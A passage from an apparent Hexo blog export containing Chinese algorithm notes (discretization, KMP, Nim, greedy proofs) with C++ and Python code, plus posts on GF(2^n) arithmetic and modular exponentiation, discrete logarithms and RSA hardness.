class=\"number\">0</span>;i&lt;=x;i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;c[i]&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;=x;i++) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;S(i)&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"离散化\"><a href=\"#离散化\" class=\"headerlink\" title=\"离散化\"></a>离散化</h3><ul>\n<li><p><a href=\"https://vijos.org/p/1056\" target=\"_blank\" rel=\"noopener\">图形面积</a>，<a href=\"http://www.cnblogs.com/forgot93/archive/2014/07/02/3819956.html\" target=\"_blank\" rel=\"noopener\">解答</a></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">double</span> x[<span class=\"number\">201</span>],y[<span class=\"number\">201</span>],s[<span class=\"number\">101</span>][<span class=\"number\">4</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> xy[<span class=\"number\">201</span>][<span class=\"number\">201</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> n,cas=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">double</span> sum;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i,j,k;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;n)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(n==<span class=\"number\">0</span>)   <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        cas++;</span><br><span class=\"line\">        k=<span class=\"number\">0</span>;</span><br><span class=\"line\">        sum=<span class=\"number\">0.0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(xy,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(xy));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cin</span>&gt;&gt;s[i][<span class=\"number\">0</span>]&gt;&gt;s[i][<span class=\"number\">1</span>]&gt;&gt;s[i][<span class=\"number\">2</span>]&gt;&gt;s[i][<span class=\"number\">3</span>];</span><br><span class=\"line\">            x[k]=s[i][<span class=\"number\">0</span>];</span><br><span class=\"line\">            y[k]=s[i][<span class=\"number\">1</span>];</span><br><span class=\"line\">            k++;</span><br><span class=\"line\">            x[k]=s[i][<span class=\"number\">2</span>];</span><br><span class=\"line\">            y[k]=s[i][<span class=\"number\">3</span>];</span><br><span class=\"line\">            k++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sort(x,x+<span class=\"number\">2</span>*n);</span><br><span class=\"line\">        sort(y,y+<span class=\"number\">2</span>*n);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">         <span class=\"keyword\">int</span>  i1=lower_bound(x,x+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">0</span>])-x;<span class=\"comment\">//二分查找，跟普通的FOR语句一样</span></span><br><span class=\"line\">         <span class=\"keyword\">int</span>  j1=lower_bound(y,y+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">1</span>])-y;</span><br><span class=\"line\">         <span class=\"keyword\">int</span>  i2=lower_bound(x,x+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">2</span>])-x;</span><br><span class=\"line\">         <span class=\"keyword\">int</span>  j2=lower_bound(y,y+<span class=\"number\">2</span>*n,s[i][<span class=\"number\">3</span>])-y;</span><br><span class=\"line\">         <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p1=i1;p1&lt;i2;p1++)</span><br><span class=\"line\">           <span class=\"comment\">//标记状态，记住我们是以一个方块的角标记状态所以p1&lt;i2，不是&lt;=</span></span><br><span class=\"line\">         <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p=j1;p&lt;j2;p++)</span><br><span class=\"line\">         xy[p1][p]=<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">2</span>*n;i++)<span class=\"comment\">//统计</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">2</span>*n;j++)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (xy[i][j]) &#123;</span><br><span class=\"line\">            sum+=(x[i+<span class=\"number\">1</span>]-x[i])*(y[j+<span class=\"number\">1</span>]-y[j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">\"Test case #%d\\n\"</span>,cas);</span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">\"Total explored area: %.2f\\n\"</span>,sum);</span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。</p>\n</li>\n</ul>\n<h3 id=\"POJ3278\"><a href=\"#POJ3278\" class=\"headerlink\" title=\"POJ3278\"></a>POJ3278</h3><ul>\n<li>N是人的位置，K是牛的位置</li>\n<li>一种lgN的做法<ul>\n<li>如果N的二进制大于等于K的二进制，则直接走x-1法</li>\n<li>否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1）</li>\n<li>假设K与N重合的二进制部分为W<ul>\n<li>如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W）</li>\n<li>如果W&gt;N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合</li>\n<li>即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W）</li>\n</ul>\n</li>\n<li>总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2…P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间</li>\n<li>也就是不断试错的过程</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"子集和问题的动态规划解法\"><a href=\"#子集和问题的动态规划解法\" class=\"headerlink\" title=\"子集和问题的动态规划解法\"></a>子集和问题的动态规划解法</h3><ul>\n<li>如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行</li>\n</ul>\n<h3 id=\"子集和问题变形\"><a href=\"#子集和问题变形\" class=\"headerlink\" title=\"子集和问题变形\"></a>子集和问题变形</h3><ul>\n<li>问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划</li>\n</ul>\n<h3 id=\"floyd求最小环\"><a href=\"#floyd求最小环\" class=\"headerlink\" title=\"floyd求最小环\"></a>floyd求最小环</h3><ul>\n<li>最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边）</li>\n<li>如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。</li>\n<li>否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到</li>\n</ul>\n<h3 id=\"查询第K大\"><a href=\"#查询第K大\" class=\"headerlink\" title=\"查询第K大\"></a>查询第K大</h3><ul>\n<li>如果是静态数组，多次查询，直接一个sort</li>\n<li>如果是静态数组，一次查询，算导中那个快排变体，$O(N)$</li>\n<li>如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快</li>\n</ul>\n<h3 id=\"Nim游戏（博弈论）\"><a href=\"#Nim游戏（博弈论）\" class=\"headerlink\" title=\"Nim游戏（博弈论）\"></a>Nim游戏（博弈论）</h3><ul>\n<li><blockquote>\n<p>定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。</p>\n</blockquote>\n</li>\n<li>P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。</li>\n<li>通过数学归纳法，两堆石子的情况下，两堆相等是P-position</li>\n<li><blockquote>\n<p>如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。</p>\n</blockquote>\n</li>\n<li></li>\n</ul>\n<h3 id=\"HDU3483\"><a href=\"#HDU3483\" class=\"headerlink\" title=\"HDU3483\"></a>HDU3483</h3><h5 id=\"题意\"><a href=\"#题意\" class=\"headerlink\" title=\"[题意]\"></a>[题意]</h5><p>输入n, x, m ，求$(1^x)<em>(x^1)+(2^x)</em>(x^2)+(3^x)<em>(x^3)+…+(n^x)</em>(x^n)$ </p>\n<h5 id=\"解题方法\"><a href=\"#解题方法\" class=\"headerlink\" title=\"[解题方法]\"></a>[解题方法]</h5><p>设$f[n] = [x^n, n<em>(x^n), (n^2)</em>(x^n),…, (n^x)<em>(x^n)]$，则$f[n][k] = (n^k)</em>(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+…+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)<em>(x^(n+1)) \\text{（二次多项式展开）}\\ = x</em>( C(k,0)<em>(x^n)+C(k,1)</em>n<em>(x^n)+…+C(k,k)</em>(n^k)<em>(x^n))\\= x</em>(C(k,0)<em>f[n][0]+C(k,1)</em>f[n][1]+…+C(k,k)*f[n][k])​$$<br>所以得： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|x*1 0................................0|        |f[n][0]|       |f[n+1][0]| </span><br><span class=\"line\">|x*1 x*1 0............................0|        |f[n][1]|       |f[n+1][1]| </span><br><span class=\"line\">|x*1 x*2 x*1 0........................0|    *   |f[n][2]|   =   |f[n+1][2]| </span><br><span class=\"line\">|......................................|        |.......|       |.........| </span><br><span class=\"line\">|x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0|        |f[n][k]|       |f[n+1][k]| </span><br><span class=\"line\">|......................................|        |.......|       |.........| </span><br><span class=\"line\">|x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0|        |f[n][x]|       |f[n+1][x]| </span><br><span class=\"line\">|0................................0 1 1|        |g[n-1] |       | g[ n ]  |</span><br></pre></td></tr></table></figure>\n<h3 id=\"KMP算法理解\"><a href=\"#KMP算法理解\" class=\"headerlink\" title=\"KMP算法理解\"></a>KMP算法理解</h3><h4 id=\"预处理算法\"><a href=\"#预处理算法\" class=\"headerlink\" title=\"预处理算法\"></a>预处理算法</h4><ul>\n<li>预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。</li>\n</ul>\n<h3 id=\"为什么偶数长度的回文数字串不是primer\"><a href=\"#为什么偶数长度的回文数字串不是primer\" class=\"headerlink\" title=\"为什么偶数长度的回文数字串不是primer\"></a>为什么偶数长度的回文数字串不是primer</h3><ul>\n<li><a href=\"https://leetcode.com/problems/prime-palindrome/discuss/212297/Why-even-prime-palindromes-are-not-possible\" target=\"_blank\" rel=\"noopener\">ref</a></li>\n<li><blockquote>\n<p>Because even length prime digit numbers are divisible by 11 therefore are not prime.<br>It’s a trick that has to do powers of 10 and mod 11.<br>Ex: 10 = 10^1 mod 11 = -1 mod 11<br>​      $100 = 10^2 = 1 \\mod 11$<br>​      $1000 = 10^3 = -1 \\mod 11$<br>​      $10000 = 10^4 = 1 \\mod 11$<br>See the pattern?<br>Even exponent powers of 10 are 1 mod 11<br>Odd exponent powers of 10 are -1 mod 11.</p>\n<p>We also know decimal numbers are just base 10 expansion of the digits.</p>\n<p>So   $1225 = (10^3<em>)1 + 2</em>(10^2) + 2<em>(10^1) + 5</em>(10^0).$<br>​        using modular arithmetic we can say,</p>\n<pre><code>1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8.\n\nIn other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits.\n</code></pre><p>Another example.</p>\n<p>$1323412 \\mod 11 =   1 -3  +2 -3 +4 -1 +2\\mod 11 = 0.$</p>\n<p>Then it becomes why it is quite obvious why the above logic works for even palindromes.</p>\n<p>Example: </p>\n<p>$321123 =      -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"贪心算法总结\"><a href=\"#贪心算法总结\" class=\"headerlink\" title=\"贪心算法总结\"></a>贪心算法总结</h3><ul>\n<li>在每个贪心算法后面几乎总有一个DP解法</li>\n<li>如何<strong>证明</strong>是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素</li>\n<li>如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法</li>\n</ul>\n<h5 id=\"贪心选择性质\"><a href=\"#贪心选择性质\" class=\"headerlink\" title=\"贪心选择性质\"></a>贪心选择性质</h5><ul>\n<li>可以通过做出局部最优的选择来构造全局最优</li>\n<li>证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题</li>\n</ul>\n<h5 id=\"一组有效的步骤\"><a href=\"#一组有效的步骤\" class=\"headerlink\" title=\"一组有效的步骤\"></a>一组有效的步骤</h5><ul>\n<li>确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质）</li>\n<li>设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP）</li>\n<li>证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少）</li>\n<li>证明贪心选择总是安全的<ul>\n<li>什么是安全的？</li>\n<li>做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li>\n<li>做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li>\n</ul>\n</li>\n<li>设计一个递归算法实现贪心策略</li>\n<li>把递归算法转为迭代算法</li>\n</ul>\n<h5 id=\"一组简化的步骤\"><a href=\"#一组简化的步骤\" class=\"headerlink\" title=\"一组简化的步骤\"></a>一组简化的步骤</h5><ul>\n<li>将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解</li>\n<li>证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li>\n<li>证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li>\n</ul>\n","slug":"My-ACM-Note","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"},{"name":"note","slug":"note","permalink":"https://h-zex.github.io/tags/note/"}]},{"title":"GF 2^n上算术运算的实现","date":"2018-10-18T12:06:10.000Z","path":"2018/10/18/GF-2-n上算术运算的实现/","text":"代码 几个关键点 求模时，算法如下 123456789101112131415def __modAndDiv__(x, y): \"\"\" return the (x%y, x/y) \"\"\" if y == 0: raise ZeroDivisionError xl = util.bitLen(x) yl = util.bitLen(y) if xl &lt; yl: return x, 0 d = 0 while xl &gt;= yl: x, d = Polynomial.__sub__(x, y &lt;&lt; (xl - yl)), Polynomial.__add__(d, (1 &lt;&lt; (xl - yl))) xl = util.bitLen(x) return x, d 要注意，不可以直接__sub__(x, y)，要__sub__(x, y&lt;&lt;(xl-yl))，保证y&lt;&lt;(xl-yl)的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为x^y^y=x，也就是减去两次y等于没有减，从而死循环 计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元","raw":"---\ntitle: GF 2^n上算术运算的实现\ndate: 2018-10-18 20:06:10\ntags:\n- GF2n\ncategories:\n- 数学\n- 密码学\n---\n\n- [代码](https://github.com/H-ZeX/Cryptorgraphy-Course/blob/master/CryptographyLib/GF2nElement.py)\n\n- 几个关键点\n\n  - 求模时，算法如下\n\n    ```python\n    def __modAndDiv__(x, y):\n        \"\"\"\n        return the (x%y, x/y)\n        \"\"\"\n        if y == 0:\n            raise ZeroDivisionError\n        xl = util.bitLen(x)\n        yl = util.bitLen(y)\n        if xl < yl:\n            return x, 0\n        d = 0\n        while xl >= yl:\n            x, d = Polynomial.__sub__(x, y << (xl - yl)), Polynomial.__add__(d, (1 << (xl - yl)))\n            xl = util.bitLen(x)\n        return x, d\n    ```\n\n    要注意，不可以直接`__sub__(x, y)`，要`__sub__(x, y<<(xl-yl))`，保证`y<<(xl-yl)`的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为`x^y^y=x`，也就是减去两次`y`等于没有减，从而死循环\n\n  - 计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元\n","content":"<ul>\n<li><p><a href=\"https://github.com/H-ZeX/Cryptorgraphy-Course/blob/master/CryptographyLib/GF2nElement.py\" target=\"_blank\" rel=\"noopener\">代码</a></p>\n</li>\n<li><p>几个关键点</p>\n<ul>\n<li><p>求模时，算法如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__modAndDiv__</span><span class=\"params\">(x, y)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    return the (x%y, x/y)</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> y == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ZeroDivisionError</span><br><span class=\"line\">    xl = util.bitLen(x)</span><br><span class=\"line\">    yl = util.bitLen(y)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> xl &lt; yl:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> x, <span class=\"number\">0</span></span><br><span class=\"line\">    d = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> xl &gt;= yl:</span><br><span class=\"line\">        x, d = Polynomial.__sub__(x, y &lt;&lt; (xl - yl)), Polynomial.__add__(d, (<span class=\"number\">1</span> &lt;&lt; (xl - yl)))</span><br><span class=\"line\">        xl = util.bitLen(x)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x, d</span><br></pre></td></tr></table></figure>\n<p>要注意，不可以直接<code>__sub__(x, y)</code>，要<code>__sub__(x, y&lt;&lt;(xl-yl))</code>，保证<code>y&lt;&lt;(xl-yl)</code>的最高位与x的最高位是同一位，这样才能把x变小。如果直接减，因为<code>x^y^y=x</code>，也就是减去两次<code>y</code>等于没有减，从而死循环</p>\n</li>\n<li><p>计算乘法逆元时，可以使用extend gcd，也可以使用拉格朗日定理$a^{|s|}=e$（e是群S上的单位元），从而$a^{|s|-1}=a^{-1}$——因为每个元素都只有唯一逆元</p>\n</li>\n</ul>\n</li>\n</ul>\n","slug":"GF-2-n上算术运算的实现","categories":[{"name":"数学","slug":"数学","permalink":"https://h-zex.github.io/categories/数学/"},{"name":"密码学","slug":"数学/密码学","permalink":"https://h-zex.github.io/categories/数学/密码学/"}],"tags":[{"name":"GF2n","slug":"GF2n","permalink":"https://h-zex.github.io/tags/GF2n/"}]},{"title":"$x^y=z(mod\\ n) 的所有相关问题的解法$","date":"2018-10-18T10:45:58.000Z","path":"2018/10/18/y-z-mod-n-的所有相关问题的解法/","text":"以下$x$为未知数。所有数都是整数 $a^x=b(mod\\ n)$ 这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。 当$gcd(a, n)=n$时 如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数 当$gcd(a,n)=1$时 使用baby-step giant-step算法，具体可以参考求解a^x=b(mod m) $x^a=b(mod\\ n)$ 这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性 $n$为质数时 根据费尔马小定理有$x^{n-1}=1(mod\\ n)$ 求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\\ n)$ $n$为合数时 目前是没有通用的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有 可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\\times t^{-1}(mod\\ pqt)$ $a^b=x(mod\\ n)$ 快速模幂，算法如下 123456789101112def fastModulePow(x, y, n): \"\"\" :return: x**y mod n \"\"\" if y == 0: return 1 % n ans, x = 1 % n, x % n while y != 0: if (y &amp; 1) == 1: ans = x * ans % n x, y = x * x % n, y // 2 return ans","raw":"---\ntitle: $x^y=z(mod\\ n) 的所有相关问题的解法$\ndate: 2018-10-18 18:45:58\ntags:\n- 离散对数\n- 快速幂\n- RSA\ncategories:\n- 数学\n- 密码学\n---\n\n> 以下$x$为未知数。所有数都是整数\n\n## $a^x=b(mod\\ n)$\n\n- 这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。\n\n#### 当$gcd(a, n)=n$时\n\n- 如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数\n\n#### 当$gcd(a,n)=1$时\n\n- 使用baby-step giant-step算法，具体可以参考[求解a^x=b(mod m)](http://www.narutoacm.com/archives/solve-discrete-log/)\n\n## $x^a=b(mod\\ n)$\n\n- 这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性\n\n#### $n$为质数时\n\n- 根据费尔马小定理有$x^{n-1}=1(mod\\ n)$\n- 求解a在模$n-1$下的乘法逆元$b$，$x^{ab}=x^{1+k(n-1)}=x(mod\\ n)$\n\n#### $n$为合数时\n\n- 目前是没有**通用**的高效解的——不仅仅在$n=pq$（p、q为质数）时没有，而是$n$为任意合数时都没有\n- 可以构造如下规约，使得如果$n$为多个（大于2个）质数的积时有高效解，那么RSA就被攻破。假设$y^e=c(mod\\ pq)$，即$y^e+kpq=c$，然后假设有一个算法，对于$n=rst$（r、s、t为任意质数）时有高效算法$T$，那么，我们两边乘以$t^e$得到 $y^e\\times t^e +kpqt^e=(yt)^e+kpqt^e=ct^e$，模上$pqt$，得到$(yt)^e=ct^e(mod\\ pqt)$，让算法$T$求解出$yt$，从而，我们得到了$y=yt\\times t^{-1}(mod\\ pqt)$\n\n## $a^b=x(mod\\ n)$\n\n- 快速模幂，算法如下\n\n  ```python\n  def fastModulePow(x, y, n):\n      \"\"\"\n      :return: x**y mod n\n      \"\"\"\n      if y == 0:\n          return 1 % n\n      ans, x = 1 % n, x % n\n      while y != 0:\n          if (y & 1) == 1:\n              ans = x * ans % n\n          x, y = x * x % n, y // 2\n      return ans\n  ```\n\n","content":"<blockquote>\n<p>以下$x$为未知数。所有数都是整数</p>\n</blockquote>\n<h2 id=\"a-x-b-mod-n\"><a href=\"#a-x-b-mod-n\" class=\"headerlink\" title=\"$a^x=b(mod\\ n)$\"></a>$a^x=b(mod\\ n)$</h2><ul>\n<li>这是离散对数问题，是一个难的问题——Diffie-Hellman算法就依赖于该问题的难解性。</li>\n</ul>\n<h4 id=\"当-gcd-a-n-n-时\"><a href=\"#当-gcd-a-n-n-时\" class=\"headerlink\" title=\"当$gcd(a, n)=n$时\"></a>当$gcd(a, n)=n$时</h4><ul>\n<li>如果$b=1$，则$x=0$，如果$b=0$，则x为任意正数</li>\n</ul>\n<h4 id=\"当-gcd-a-n-1-时\"><a href=\"#当-gcd-a-n-1-时\" class=\"headerlink\" title=\"当$gcd(a,n)=1$时\"></a>当$gcd(a,n)=1$时</h4><ul>\n<li>使用baby-step giant-step算法，具体可以参考<a href=\"http://www.narutoacm.com/archives/solve-discrete-log/\" target=\"_blank\" rel=\"noopener\">求解a^x=b(mod m)</a></li>\n</ul>\n<h2 id=\"x-a-b-mod-n\"><a href=\"#x-a-b-mod-n\" class=\"headerlink\" title=\"$x^a=b(mod\\ n)$\"></a>$x^a=b(mod\\ n)$</h2><ul>\n<li>这也是一个难的问题，目前并没有高效的通解，RSA算法就依赖于$n=pq$（p、q为质数）时x的难解性</li>\n</ul>\n<h4 